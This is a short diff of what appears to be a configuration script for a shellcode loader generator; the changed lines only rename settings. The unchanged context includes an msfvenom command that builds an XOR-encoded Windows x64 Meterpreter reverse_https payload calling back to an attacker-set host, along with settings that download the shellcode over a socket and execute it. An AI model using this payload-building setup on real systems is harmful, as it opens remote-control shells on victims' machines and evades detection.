@@ -26,14 +26,14 @@ LHOST=$GLOBAL_LHOST
 msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -b '\x00' -f raw --platform Windows > output/thepayload.bin
 
 # set shellcode source
-set_shellcode_source download_socket
+set_payload_source download_socket
 
 # set decoder and key source
 set_decoder none
 set_key_source none
 
 # set shellcode binding technique
-set_shellcode_binding exec_shellcode64
+set_payload_execution_method exec_shellcode64
 
 # enable debug output
 enable_debug_print
